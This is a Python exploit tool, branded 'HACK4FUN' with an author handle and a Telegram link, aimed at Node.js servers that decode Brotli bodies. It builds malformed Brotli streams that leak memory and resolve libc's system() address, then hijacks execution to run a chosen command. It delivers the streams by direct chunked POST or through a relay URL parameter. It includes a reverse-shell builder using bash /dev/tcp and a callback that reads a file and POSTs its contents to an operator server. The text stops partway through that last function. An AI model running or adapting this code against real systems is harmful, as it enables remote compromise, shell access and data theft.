#!/usr/bin/env python3
import argparse
import http.client
import json
import math
import os
import queue
import selectors
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.parse

WHITE = "\033[38;5;231m"
BLUE = "\033[38;5;39m"
RED = "\033[38;5;196m"
ORANGE = "\033[38;5;214m"
CYAN = "\033[38;5;51m"
GREEN = "\033[38;5;46m"
MAGENTA = "\033[38;5;201m"
DIM = "\033[38;5;244m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"

BANNER = [
    "██╗  ██╗  █████╗   ██████╗ ██╗  ██╗ ██╗  ██╗ ███████╗ ██╗   ██╗ ███╗   ██╗",
    "██║  ██║ ██╔══██╗ ██╔════╝ ██║ ██╔╝ ██║  ██║ ██╔════╝ ██║   ██║ ████╗  ██║",
    "███████║ ███████║ ██║      █████╔╝  ███████║ █████╗   ██║   ██║ ██╔██╗ ██║",
    "██╔══██║ ██╔══██║ ██║      ██╔═██╗  ╚════██║ ██╔══╝   ██║   ██║ ██║╚██╗██║",
    "██║  ██║ ██║  ██║ ╚██████╗ ██║  ██╗      ██║ ██║      ╚██████╔╝ ██║ ╚████║",
    "╚═╝  ╚═╝ ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝      ╚═╝ ╚═╝       ╚═════╝  ╚═╝  ╚═══╝",
]

TELEGRAM = "https://t.me/walterlamer"
VERSION = "1.0"

MASK64 = (1 << 64) - 1

STAGED_LITERALS = 38000
RING_CAPACITY = 1024
VIEW_RINGBUFFER = 480
VIEW_ARENA_LISTS = 7712
ARENA_LISTS_DELTA = 0x438
STATE_METADATA = 720
STATE_BODY_LIMIT = 280
# The insert run uses a 7-bit insert-length prefix up to 226 bytes of command.
# From 227 the encoder switches to the 8-bit insert code (structure 14, insert
# code 18), which corrupts the decoder and kills the target (SIGSEGV) instead
# of calling system(); keep the verified short path.
STATE_LONG_LIMIT = 227
STRUCT_SKIP = 7
TREE_LEVEL = 8
TAIL_BYTES = 17
TAIL_MARKER = 0x3F

DISTANCE_CODE = 176
DISTANCE_BITS = 11
DISTANCE_EXTRA = 512
BLOCK_LIMIT = 1 << 24

LEAK_POSITION = 323012
LEAK_TRIGGER_J = 0x3F
LEAK_DICTIONARY = 34816
LEAK_WINDOW_BITS = 19

STATE_STREAM_COMMANDS = 1 << 24
STATE_STREAM_INSERT = 38000
STATE_TAIL_HIGH = 0x12
STATE_TAIL_SPLIT = 7
STATE_TAIL_MARKER = 0x08

IMAGE_EXECVP_OFFSET = 0xD4F00
IMAGE_SYSTEM_OFFSET = 0x4C490
IMAGE_NAMES = ("официальная сборка node 26.12.0 linux-x64",)

INSERT_EXTRA = [0, 0, 0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5,
                6, 7, 8, 9, 10, 12, 14, 24]
CELL_POSITION = [0, 1, 0, 1, 8, 9, 2, 16, 10, 17, 18]
TREE_ORDER = [1, 2, 3, 4, 0, 5, 17, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15]
PREFIX_LENGTH = [2, 2, 2, 3, 2, 2, 2, 4, 2, 2, 2, 3, 2, 2, 2, 4]
PREFIX_VALUE = [0, 4, 3, 2, 0, 4, 3, 1, 0, 4, 3, 2, 0, 4, 3, 5]


class UsageError(Exception):
    pass


class Paint:
    def __init__(self, enabled):
        self.enabled = enabled

    def colour(self, code, text, underline=False):
        if not self.enabled:
            return text
        prefix = code + (UNDERLINE if underline else "")
        return prefix + text + RESET

    def banner(self):
        colours = [WHITE, WHITE, BLUE, BLUE, RED, RED]
        return "\n".join(self.colour(code, row) for code, row in zip(colours, BANNER))

    def signature(self):
        made = self.colour(ORANGE, "Made by Walter White (Lamer)")
        link = self.colour(ORANGE, TELEGRAM, underline=True)
        return made + "\n" + link

    def title(self, text):
        return self.colour(BOLD + ORANGE, text)

    def accent(self, text):
        return self.colour(ORANGE, text)

    def cyan(self, text):
        return self.colour(CYAN, text)

    def dim(self, text):
        return self.colour(DIM, text)

    def ok(self, text):
        return self.colour(GREEN, text)

    def bad(self, text):
        return self.colour(RED, text)

    def mark(self, text):
        return self.colour(MAGENTA, text)


class Reporter:
    def __init__(self, paint, quiet, stream=None):
        self.paint = paint
        self.quiet = quiet
        self.stream = stream or sys.stdout

    def line(self, mark, colour, text):
        if self.quiet:
            return
        symbol = self.paint.colour(colour, mark)
        self.stream.write(symbol + " " + text + "\n")
        self.stream.flush()

    def info(self, text):
        self.line("[*]", CYAN, text)

    def ok(self, text):
        self.line("[+]", GREEN, text)

    def bad(self, text):
        self.line("[-]", RED, text)

    def step(self, text):
        self.line("[>]", ORANGE, text)

    def detail(self, text):
        if self.quiet:
            return
        self.stream.write("    " + self.paint.dim(text) + "\n")
        self.stream.flush()

    def verdict(self, success, text):
        symbol = self.paint.ok("[+]") if success else self.paint.bad("[-]")
        self.stream.write(symbol + " " + text + "\n")
        self.stream.flush()

    def output(self, data):
        text = data.decode("utf-8", "replace")
        if text and not text.endswith("\n"):
            text += "\n"
        self.stream.write(text)
        self.stream.flush()


class BitWriter:
    def __init__(self):
        self.buffer = bytearray()
        self.current = 0
        self.filled = 0
        self.total = 0

    def put(self, value, count):
        for index in range(count):
            if (value >> index) & 1:
                self.current |= 1 << self.filled
            self.filled += 1
            self.total += 1
            if self.filled == 8:
                self.buffer.append(self.current)
                self.current = 0
                self.filled = 0

    def put_bytes(self, data):
        if self.filled:
            raise ValueError("bit stream is not aligned")
        self.buffer += data
        self.total += 8 * len(data)

    def finish(self):
        result = bytearray(self.buffer)
        if self.filled:
            result.append(self.current)
        return bytes(result)

    def value(self):
        return int.from_bytes(self.finish(), "little")


def simple_tree(writer, symbols, alphabet):
    if not 1 <= len(symbols) <= 4:
        raise ValueError("unsupported simple tree size")
    writer.put(1, 2)
    writer.put(len(symbols) - 1, 2)
    width = (alphabet - 1).bit_length()
    for symbol in symbols:
        writer.put(symbol, width)
    if len(symbols) == 4:
        writer.put(0, 1)


def build_offsets(table):
    offsets = [0]
    for index in range(len(table) - 1):
        offsets.append(offsets[index] + (1 << table[index]))
    return offsets


INSERT_BASE = build_offsets(INSERT_EXTRA)


def command_table():
    result = {}
    for symbol in range(704):
        cell = symbol >> 6
        position = CELL_POSITION[cell]
        copy_code = ((position << 3) & 0x18) + (symbol & 0x7)
        insert_code = (position & 0x18) + ((symbol >> 3) & 0x7)
        result[symbol] = (insert_code, copy_code, cell >= 2)
    return result


COMMAND_TABLE = command_table()


def distance_table(npostfix=0, ndirect=0, max_bits=24):
    alphabet = 16 + ndirect + (max_bits << (npostfix + 1))
    postfix = 1 << npostfix
    result = {}
    symbol = 16
    for index in range(ndirect):
        result[symbol] = (0, index + 1)
        symbol += 1
    width = 1
    half = 0
    while symbol < alphabet:
        base = ndirect + ((((2 + half) << width) - 4) << npostfix) + 1
        for index in range(postfix):
            result[symbol] = (width, base + index)
            symbol += 1
        width = width + half
        half = half ^ 1
    return result


DISTANCE_TABLE = distance_table()
DISTANCE_TABLE_FULL = distance_table(3, 0, 24)
DISTANCE_ALPHABET = 16 + (24 << 1)
DISTANCE_ALPHABET_FULL = 16 + (24 << 4)


def distance_code(distance, table):
    for code in sorted(table):
        width, base = table[code]
        if base <= distance <= base + (1 << width) - 1:
            return code, width, distance - base
    raise ValueError("distance is not encodable")


def put_cl_value(writer, value):
    for index in range(16):
        if PREFIX_VALUE[index] == value and PREFIX_LENGTH[index] == 2:
            writer.put(index, 2)
            return
    if value == 1:
        writer.put(7, 4)
        return
    raise ValueError("code length is not encodable")


def complex_literal_tree(writer, payload, forced_level=None):
    distinct = sorted(set(payload)) or [0]
    level = 4
    while (1 << level) < len(distinct):
        level += 1
    if forced_level and forced_level > level:
        level = forced_level
    filler = 0
    while len(distinct) < (1 << level):
        if filler not in distinct:
            distinct.append(filler)
        filler += 1
    distinct = sorted(distinct[:1 << level])
    writer.put(0, 2)
    space = 32
    for index in TREE_ORDER:
        value = 1 if (index == 0 or index == level) else 0
        put_cl_value(writer, value)
        if value:
            space -= 32 >> value
            if (space - 1) & 0xFFFFFFFF >= 32:
                break
    space = 32768
    for symbol in range(256):
        chosen = symbol in distinct
        writer.put(1 if chosen else 0, 1)
        if chosen:
            space -= 32768 >> level
            if space == 0:
                break
    return level, distinct


def build_leak_stream(got=0):
    position = LEAK_POSITION
    dictionary_distance = position + 1 + LEAK_DICTIONARY
    code_distance, width_distance, extra_distance = distance_code(position, DISTANCE_TABLE)
    code_body, width_body, extra_body = distance_code(dictionary_distance, DISTANCE_TABLE)
    if (code_distance, width_distance) != (code_body, width_body):
        raise ValueError("distance code mismatch")
    insert_extra = position - INSERT_BASE[23]
    remaining = position + 8
    writer = BitWriter()
    writer.put(1, 1)
    writer.put(LEAK_WINDOW_BITS - 17, 3)
    marker = remaining - 1
    nibbles = 4
    while marker >= (1 << (4 * nibbles)):
        nibbles += 1
    if nibbles < 4:
        nibbles = 4
    writer.put(1, 1)
    writer.put(0, 1)
    writer.put(nibbles - 4, 2)
    writer.put(marker, nibbles * 4)
    writer.put(0, 1)
    writer.put(1, 1)
    writer.put(0, 3)
    simple_tree(writer, [0], 4)
    simple_tree(writer, [25], 26)
    writer.put(0xFFFFFF, 24)
    writer.put(0, 1)
    writer.put(0, 6)
    writer.put(0, 2)
    writer.put(0, 1)
    writer.put(0, 1)
    simple_tree(writer, [65, 66], 256)
    simple_tree(writer, [130, 506, 134], 704)
    simple_tree(writer, [130, 506, 134], 704)
    simple_tree(writer, [code_distance], DISTANCE_ALPHABET)
    code, bits = symbol_code(506)
    writer.put(code, bits)
    if INSERT_EXTRA[23]:
        writer.put(insert_extra, INSERT_EXTRA[23])
    literals = position
    while literals:
        if writer.filled == 0:
            whole = literals // 8
            if whole:
                writer.put_bytes(b"\x00" * whole)
                literals -= 8 * whole
                continue
        writer.put(0, 1)
        literals -= 1
    writer.put(extra_body, width_body)
    per_command = 1 + width_body
    command_word = (extra_body << 1) & ((1 << per_command) - 1)
    cycle_count = 8 // math.gcd(per_command, 8)
    cycle_bits = cycle_count * per_command
    cycle_value = 0
    for index in range(cycle_count):
        cycle_value |= command_word << (index * per_command)
    head = (-writer.filled) % 8
    commands = BLOCK_LIMIT - 1
    if head:
        take = min(head, commands * per_command)
        writer.put(command_word & ((1 << take) - 1), take)
        left = commands * per_command - take
    else:
        left = commands * per_command
    if left > 0:
        rotation = head % cycle_bits
        rotated = (cycle_value >> rotation) | ((cycle_value & ((1 << rotation) - 1)) << (cycle_bits - rotation))
        cycle_bytes = rotated.to_bytes(cycle_bits // 8, "little")
        whole = left // cycle_bits
        if whole:
            writer.put_bytes(cycle_bytes * whole)
        rest = left - cycle_bits * whole
        if rest:
            writer.put(rotated & ((1 << rest) - 1), rest)
    code, bits = symbol_code(134)
    writer.put(code, bits)
    writer.put(extra_distance, width_distance)
    data = writer.finish()
    tail = bytes(8) + bytes([LEAK_TRIGGER_J]) + struct.pack("<Q", got)
    return data, tail


def symbol_code(symbol):
    order = [130, 506, 134]
    if symbol == order[0]:
        return 0, 1
    smaller = min(order[1], order[2])
    return (0b01, 2) if symbol == smaller else (0b11, 2)


def build_state_stream():
    code, extra_bits, extra_value = 42, 14, 3060
    writer = BitWriter()
    writer.put(1, 1)
    writer.put(0, 3)
    writer.put(2, 3)
    writer.put(0, 1)
    marker = STATE_STREAM_INSERT - 1
    nibbles = 4
    while marker >= (1 << (4 * nibbles)):
        nibbles += 1
    writer.put(nibbles - 4, 2)
    writer.put(marker, nibbles * 4)
    writer.put(0, 1)
    writer.put(0, 1)
    writer.put(1, 1)
    writer.put(0, 3)
    simple_tree(writer, [0], 4)
    simple_tree(writer, [25], 26)
    writer.put(0xFFFFFF, 24)
    writer.put(0, 1)
    writer.put(0, 2)
    writer.put(0, 4)
    writer.put(0, 2)
    writer.put(0, 1)
    writer.put(0, 1)
    simple_tree(writer, [65, 66], 256)
    simple_tree(writer, [130, 506], 704)
    simple_tree(writer, [130, 506], 704)
    simple_tree(writer, [code], 16 + (24 << 1))
    header_bits = writer.total
    stride = 1 + extra_bits
    command = (extra_value << 1) & ((1 << stride) - 1)
    cycle_bits = stride * 8
    cycle_value = 0
    for index in range(8):
        cycle_value |= command << (stride * index)
    cycle = cycle_value.to_bytes(stride, "little")
    body = cycle * (STATE_STREAM_COMMANDS // 8)
    rotation = header_bits % 8
    whole = header_bits // 8
    header_value = writer.value()
    leftover = header_value >> (8 * whole)
    output = bytearray((header_value & ((1 << (8 * whole)) - 1)).to_bytes(whole, "little"))
    merged = (int.from_bytes(body, "little") << rotation) | leftover
    output.extend(merged.to_bytes((rotation + 8 * len(body) + 7) // 8, "little"))
    split = STATE_TAIL_SPLIT
    trailer = BitWriter()
    trailer.put(0, 1)
    trailer.put(extra_value & ((1 << split) - 1), split)
    if rotation:
        merged_tail = (trailer.value() << rotation) | output[-1]
        output[-1:] = merged_tail.to_bytes((rotation + trailer.total + 7) // 8, "little")
    else:
        output.extend(trailer.value().to_bytes((trailer.total + 7) // 8, "little"))
    tail_writer = BitWriter()
    tail_writer.put(extra_value >> split, extra_bits - split)
    tail_writer.put(1, 1)
    tail_writer.put(STATE_STREAM_INSERT - 22594, 24)
    tail = bytearray(20)
    tail[0:4] = tail_writer.value().to_bytes(4, "little")
    tail[8] = STATE_TAIL_MARKER
    tail[9] = STATE_TAIL_HIGH
    return bytes(output), bytes(tail)


def geometry(length):
    garbage = 71
    for attempt in range(8):
        insert = garbage + length + 24
        found = None
        for candidate in range(24):
            base = INSERT_BASE[candidate]
            width = INSERT_EXTRA[candidate]
            if base <= insert <= base + (1 << width) - 1:
                found = candidate
                break
        if found is None:
            raise ValueError("insert length is not encodable")
        structure = (DISTANCE_BITS - STRUCT_SKIP) + 2 + INSERT_EXTRA[found]
        next_garbage = 72 - structure // 8
        offset = structure % 8
        if next_garbage == garbage:
            return next_garbage, offset, structure
        garbage = next_garbage
    raise ValueError("geometry did not converge")


def insert_symbol(insert):
    for candidate in range(24):
        base = INSERT_BASE[candidate]
        width = INSERT_EXTRA[candidate]
        if base <= insert <= base + (1 << width) - 1:
            return candidate, insert - base, width
    raise ValueError("insert length is not encodable")


def command_symbol(insert_code):
    for candidate in sorted(COMMAND_TABLE):
        table_insert, table_copy, explicit = COMMAND_TABLE[candidate]
        if table_insert == insert_code and table_copy == 2 and explicit and candidate >= 128:
            return candidate
    raise ValueError("no command symbol for insert code")


def build_mb2(state, system_address, command, garbage, offset):
    command_bytes = command.encode() + b"\x00"
    length = len(command_bytes)
    insert = garbage + length + 24
    payload = command_bytes + struct.pack("<Q", system_address & MASK64) + bytes(8)
    payload += struct.pack("<Q", (state + STATE_METADATA - length) & MASK64)
    if len(payload) != length + 24:
        raise ValueError("payload size mismatch")
    insert_code, insert_extra_value, insert_width = insert_symbol(insert)
    symbol_y = command_symbol(insert_code)
    order = [130, symbol_y, 134]
    smaller = min(order[1], order[2])
    codes = {130: (0, 1), smaller: (0b01, 2),
             (order[2] if order[1] == smaller else order[1]): (0b11, 2)}
    writer = BitWriter()
    remaining = insert
    marker = remaining - 1
    nibbles = 4
    while marker >= (1 << (4 * nibbles)):
        nibbles += 1
    writer.put(0, 1)
    writer.put(nibbles - 4, 2)
    writer.put(marker, nibbles * 4)
    writer.put(0, 1)
    writer.put(0, 1)
    writer.put(1, 1)
    writer.put(0, 3)
    simple_tree(writer, [0], 4)
    simple_tree(writer, [25], 26)
    writer.put(0xFFFFFF, 24)
    writer.put(0, 1)
    writer.put(3, 2)
    writer.put(0, 4)
    writer.put(0, 2)
    writer.put(0, 1)
    writer.put(0, 1)
    level, distinct = complex_literal_tree(writer, payload, forced_level=TREE_LEVEL)
    for index in range(2):
        simple_tree(writer, order, 704)
    simple_tree(writer, [DISTANCE_CODE], DISTANCE_ALPHABET_FULL)
    per_command = 1 + DISTANCE_BITS
    command_word = (DISTANCE_EXTRA << 1) & ((1 << per_command) - 1)
    cycle_count = 8 // math.gcd(per_command, 8)
    cycle_bits = cycle_count * per_command
    cycle_value = 0
    for index in range(cycle_count):
        cycle_value |= command_word << (index * per_command)
    head = (-writer.filled) % 8
    count = BLOCK_LIMIT
    if head:
        take = min(head, count * per_command)
        writer.put(command_word & ((1 << take) - 1), take)
        left = count * per_command - take
    else:
        left = count * per_command
    if left > 0:
        rotation = head % cycle_bits
        rotated = (cycle_value >> rotation) | ((cycle_value & ((1 << rotation) - 1)) << (cycle_bits - rotation))
        cycle_bytes = rotated.to_bytes(cycle_bits // 8, "little")
        whole = left // cycle_bits
        if whole:
            writer.put_bytes(cycle_bytes * whole)
        rest = left - cycle_bits * whole
        if rest:
            writer.put(rotated & ((1 << rest) - 1), rest)
    code, bits = codes[130]
    writer.put(code, bits)
    structure = BitWriter()
    flattened = []
    for part in ((DISTANCE_EXTRA, DISTANCE_BITS), (codes[symbol_y][0], codes[symbol_y][1]),
                 (insert_extra_value, insert_width)):
        value, width = part
        for bit in range(width):
            flattened.append((value >> bit) & 1)
    for bit in flattened[STRUCT_SKIP:]:
        structure.put(bit, 1)
    structure_bytes = structure.finish()
    position_zero = STAGED_LITERALS % RING_CAPACITY
    ringbuffer = (state + (STATE_METADATA - length - garbage) - position_zero) & MASK64
    data = writer.finish()
    tail = bytearray(TAIL_BYTES)
    tail[0:len(structure_bytes)] = structure_bytes
    tail[8] = TAIL_MARKER
    tail[9:17] = struct.pack("<Q", ringbuffer)
    client = BitWriter()
    for index in range(offset):
        client.put(0, 1)
    reversed_codes = [int(format(value, "0%db" % level)[::-1], 2) for value in range(1 << level)]
    for byte in payload:
        client.put(reversed_codes[distinct.index(byte)], level)
    client.put(1, 1)
    client.put(0, 1)
    client.put(3, 2)
    client.put(0, 1)
    meta_marker = length - 1
    meta_bytes = 0
    if meta_marker:
        meta_bytes = 1
        while meta_marker >= (1 << (8 * meta_bytes)):
            meta_bytes += 1
    client.put(meta_bytes, 2)
    for index in range(meta_bytes):
        client.put((meta_marker >> (8 * index)) & 0xFF, 8)
    while client.filled:
        client.put(0, 1)
    for byte in command_bytes:
        client.put(byte, 8)
    client_bytes = client.finish()
    detail = {
        "state": state,
        "system": system_address,
        "length": length,
        "insert": insert,
        "garbage": garbage,
        "offset": offset,
        "ringbuffer": ringbuffer,
        "opaque": STATE_METADATA - length,
        "header_bit": offset + 8 * len(payload),
        "level": level,
        "body_size": len(data),
        "tail_size": len(tail),
        "client_size": len(client_bytes),
    }
    return data, bytes(tail), client_bytes, detail


def view_bits(data, offset, count):
    if offset + count > len(data):
        return 0
    value = 0
    for index in range(count):
        value |= (1 if data[offset + index] == 0x42 else 0) << index
    return value


class ChunkReader(threading.Thread):
    """Incremental chunked-body reader.

    All SSL/socket operations go through the owning channel's lock: OpenSSL
    objects are not safe for concurrent use, so this thread must never sit
    inside SSL_read while the main thread is inside SSL_write on the same
    socket.  It waits on a selector (or pending decrypted bytes) before recv,
    so it never parks inside a blocking recv holding the lock.
    """

    def __init__(self, channel):
        super().__init__(daemon=True)
        self.channel = channel
        self.sock = channel.sock
        self.buffer = bytearray()
        self.body = bytearray()
        self.head = None
        self.lock = threading.Lock()
        self.closed = False
        self.error = None
        self.remaining = 0
        self.need_crlf = False
        self.stop_event = threading.Event()
        self.selector = selectors.DefaultSelector()
        self.selector.register(self.sock, selectors.EVENT_READ)

    def run(self):
        while not self.stop_event.is_set():
            try:
                pending = self.sock.pending()
            except (AttributeError, OSError, ValueError):
                pending = 0
            if not pending:
                try:
                    ready = self.selector.select(0.2)
                except (OSError, ValueError):
                    break
                if not ready:
                    continue
            try:
                part = self.channel.recv(65536)
            except (OSError, ValueError) as error:
                self.error = error
                break
            if not part:
                break
            with self.lock:
                self.buffer += part
                self._parse()
        self.closed = True
        try:
            self.selector.close()
        except (OSError, ValueError):
            pass

    def stop(self):
        self.stop_event.set()
        if self.is_alive():
            self.join(1.0)

    def _parse(self):
        while True:
            if self.head is None:
                index = self.buffer.find(b"\r\n\r\n")
                if index < 0:
                    return
                self.head = bytes(self.buffer[:index]).decode("latin1")
                del self.buffer[:index + 4]
                if "transfer-encoding: chunked" not in self.head.lower():
                    self.body += self.buffer
                    self.buffer.clear()
                    continue
            if self.remaining:
                take = min(self.remaining, len(self.buffer))
                self.body += self.buffer[:take]
                del self.buffer[:take]
                self.remaining -= take
                if self.remaining:
                    return
                self.need_crlf = True
            if self.need_crlf:
                if len(self.buffer) < 2:
                    return
                del self.buffer[:2]
                self.need_crlf = False
            index = self.buffer.find(b"\r\n")
            if index < 0:
                return
            line = bytes(self.buffer[:index])
            del self.buffer[:index + 2]
            if not line:
                continue
            try:
                self.remaining = int(line.split(b";")[0], 16)
            except ValueError:
                return

    def snapshot(self):
        with self.lock:
            return bytes(self.body)

    def length(self):
        with self.lock:
            return len(self.body)

    def status(self):
        with self.lock:
            if not self.head:
                return None
            first = self.head.splitlines()[0]
        pieces = first.split()
        if len(pieces) >= 2 and pieces[1].isdigit():
            return int(pieces[1])
        return None


def chunk_frame(data):
    return ("%x\r\n" % len(data)).encode() + data + b"\r\n"


class Target:
    def __init__(self, address):
        if "://" not in address:
            address = "http://" + address
        parts = urllib.parse.urlsplit(address)
        if not parts.hostname:
            raise UsageError("не разобран адрес цели: %s" % address)
        self.address = address
        self.scheme = parts.scheme or "http"
        if self.scheme not in ("http", "https"):
            raise UsageError("поддерживаются только http и https: %s" % address)
        self.host = parts.hostname
        self.port = parts.port or (443 if self.scheme == "https" else 80)
        self.path = parts.path or "/"
        netloc = parts.netloc
        self.root = "%s://%s" % (self.scheme, netloc)
        self.host_header = netloc


def connect_target(target, insecure):
    sock = socket.create_connection((target.host, target.port))
    if target.scheme != "https":
        return sock
    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    try:
        return context.wrap_socket(sock, server_hostname=target.host)
    except OSError:
        sock.close()
        raise


class SocketChannel:
    """Serializes all socket/SSL operations and starts the reader lazily.

    The exploit never needs to read while it is still writing: every phase is
    sent first and collected afterwards.  Keeping writes and reads on one
    OpenSSL object strictly ordered is required, because SSL_read/SSL_write
    from two threads corrupt libssl state and crash the interpreter.
    """

    def __init__(self, sock):
        self.sock = sock
        self.lock = threading.Lock()
        self._reader = None

    def recv(self, size):
        with self.lock:
            return self.sock.recv(size)

    def write(self, data):
        with self.lock:
            self.sock.sendall(data)

    @property
    def reader(self):
        if self._reader is None:
            self._reader = ChunkReader(self)
            self._reader.start()
        return self._reader

    def close(self):
        if self._reader is not None:
            self._reader.stop()
        with self.lock:
            try:
                self.sock.close()
            except OSError:
                pass


class RequestChannel(SocketChannel):
    def __init__(self, target, timeout, insecure=False):
        sock = connect_target(target, insecure)
        super().__init__(sock)
        self.target = target
        head = ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Encoding: br\r\n"
                "Content-Type: application/octet-stream\r\nTransfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n\r\n" % (target.path, target.host_header))
        self.write(head.encode())

    def send(self, data):
        self.write(chunk_frame(data))


class FeedConnection:
    def __init__(self, stream):
        self.stream = stream
        self.queue = queue.Queue()

    def send(self, data):
        self.queue.put(data)

    def pump(self):
        try:
            while True:
                data = self.queue.get()
                if data is None:
                    return
                self.stream.write(("%x\r\n" % len(data)).encode())
                self.stream.write(data)
                self.stream.write(b"\r\n")
                self.stream.flush()
        except OSError:
            return


def operator_handler_class(owner):
    from http.server import BaseHTTPRequestHandler

    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"
        owner_ref = owner

        def log_message(self, *arguments):
            return

        def do_GET(self):
            if self.path.startswith("/feed"):
                query = urllib.parse.urlsplit(self.path).query
                token = urllib.parse.parse_qs(query).get("token", [""])[0]
                self.send_response(200)
                self.send_header("Content-Encoding", "br")
                self.send_header("Transfer-Encoding", "chunked")
                self.end_headers()
                connection = FeedConnection(self.wfile)
                self.owner_ref.register_connection(token, connection)
                connection.pump()
                return
            self.owner_ref.capture(self.path, b"")
            self.send_response(200)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"ok")
            self.wfile.flush()

        def do_POST(self):
            length = int(self.headers.get("Content-Length") or 0)
            data = self.rfile.read(length) if length else b""
            self.owner_ref.capture(self.path, data)
            self.send_response(200)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"ok")
            self.wfile.flush()

    return Handler


class OperatorServer:
    def __init__(self, host, port):
        from http.server import ThreadingHTTPServer
        self.connections = {}
        self.connections_lock = threading.Lock()
        self.callbacks = queue.Queue()
        self.httpd = ThreadingHTTPServer((host, port), operator_handler_class(self))
        self.httpd.daemon_threads = True
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    def capture(self, path, data):
        self.callbacks.put((path, data))

    def _connection_queue(self, token):
        with self.connections_lock:
            channel = self.connections.get(token)
            if channel is None:
                channel = queue.Queue()
                self.connections[token] = channel
            return channel

    def register_connection(self, token, connection):
        self._connection_queue(token).put(connection)

    def wait_connection(self, token, timeout):
        try:
            return self._connection_queue(token).get(timeout=timeout)
        except queue.Empty:
            return None

    def wait_callback(self, token, timeout):
        deadline = time.time() + timeout
        while time.time() < deadline:
            remaining = deadline - time.time()
            try:
                path, data = self.callbacks.get(timeout=min(1.0, max(remaining, 0.1)))
            except queue.Empty:
                continue
            if token in path:
                return data
        return None


def local_address(target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((target.host, target.port))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


class RelayChannel(SocketChannel):
    def __init__(self, target, server, feed_host, timeout, insecure=False):
        sock = connect_target(target, insecure)
        super().__init__(sock)
        self.target = target
        self.feed = server
        self.token = os.urandom(6).hex()
        feed_url = "http://%s:%d/feed?token=%s" % (feed_host, server.port, self.token)
        separator = "&" if "?" in target.path else "?"
        request_path = target.path + separator + "url=" + urllib.parse.quote(feed_url, safe="")
        head = ("GET %s HTTP/1.1\r\nHost: %s\r\nAccept-Encoding: br\r\n"
                "Connection: keep-alive\r\n\r\n" % (request_path, target.host_header))
        self.write(head.encode())
        self.connection = server.wait_connection(self.token, timeout)
        if self.connection is None:
            raise ConnectionError("цель не запросила встроенный сервер")

    def send(self, data):
        self.connection.send(data)


def wait_length(reader, minimum, timeout, stable=0.6):
    deadline = time.time() + timeout
    last = -1
    marked = time.time()
    while time.time() < deadline:
        length = reader.length()
        if length >= minimum:
            if length == last:
                if time.time() - marked >= stable:
                    return length
            else:
                last = length
                marked = time.time()
        time.sleep(0.05)
    return reader.length()


def probe_request(target, prelude, timeout, insecure=False):
    try:
        channel = RequestChannel(target, min(timeout, 10), insecure)
    except ssl.SSLCertVerificationError:
        raise
    except OSError:
        return False
    try:
        channel.send(prelude)
        wait_length(channel.reader, 256, 3.0, stable=0.3)
        data = channel.reader.snapshot()
    finally:
        pass
    if len(data) < 256:
        return False
    sample = data[:4096]
    hits = sum(1 for byte in sample if byte == 0x41)
    return hits * 10 >= len(sample) * 9


def probe_relay(target, server, feed_host, prelude, timeout, insecure=False):
    try:
        channel = RelayChannel(target, server, feed_host, min(timeout, 10), insecure)
    except ssl.SSLCertVerificationError:
        raise
    except (OSError, ConnectionError):
        return False
    channel.send(prelude)
    wait_length(channel.reader, 256, 3.0, stable=0.3)
    data = channel.reader.snapshot()
    if len(data) < 256:
        return False
    sample = data[:4096]
    hits = sum(1 for byte in sample if byte == 0x41)
    return hits * 10 >= len(sample) * 9


def elf_symbols(path, names):
    with open(path, "rb") as handle:
        data = handle.read()
    if data[:4] != b"\x7fELF" or data[4] != 2 or data[5] != 1:
        raise ValueError("ожидается ELF64 little-endian")
    section_offset = struct.unpack_from("<Q", data, 0x28)[0]
    section_size = struct.unpack_from("<H", data, 0x3A)[0]
    section_count = struct.unpack_from("<H", data, 0x3C)[0]
    string_index = struct.unpack_from("<H", data, 0x3E)[0]
    sections = []
    for index in range(section_count):
        offset = section_offset + index * section_size
        header = struct.unpack_from("<IIQQQQIIQQ", data, offset)
        sections.append({
            "name": header[0], "type": header[1], "offset": header[4],
            "size": header[5], "link": header[6], "entry": header[9],
        })
    if string_index >= len(sections):
        raise ValueError("нет таблицы имён секций")
    table = sections[string_index]
    names_data = data[table["offset"]:table["offset"] + table["size"]]

    def section_name(value):
        end = names_data.find(b"\x00", value)
        return names_data[value:end].decode("latin1")

    for section in sections:
        section["label"] = section_name(section["name"])
    dynamic = None
    for section in sections:
        if section["label"] == ".dynsym":
            dynamic = section
            break
    if dynamic is None:
        raise ValueError("нет .dynsym")
    string_section = sections[dynamic["link"]]
    strings = data[string_section["offset"]:string_section["offset"] + string_section["size"]]
    result = {}
    entry_size = dynamic["entry"] or 24
    for offset in range(dynamic["offset"], dynamic["offset"] + dynamic["size"], entry_size):
        name_offset = struct.unpack_from("<I", data, offset)[0]
        value = struct.unpack_from("<Q", data, offset + 8)[0]
        end = strings.find(b"\x00", name_offset)
        label = strings[name_offset:end].decode("latin1")
        if label in names:
            result[label] = value
    return result


def resolve_libc(path):
    symbols = elf_symbols(path, {"execvp", "system"})
    if "execvp" not in symbols or "system" not in symbols:
        raise ValueError("в libc не найдены execvp/system")
    return symbols["execvp"], symbols["system"]


def derive_libc(pointer, execvp_offset, system_offset):
    base = pointer - execvp_offset
    if pointer >> 40 != 0x7F or base & 0xFFF:
        raise ValueError("указатель не похож на libc")
    return base, base + system_offset


def reverse_shell_command(address, port):
    return "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'" % (address, port)


def callback_command(user_command, address, port, token, output):
    script = ('require("http").request("http://%s:%d/%s",{method:"POST"},()=>{})'
              '.end(require("fs").readFileSync("%s"))' % (address, port, token, output))
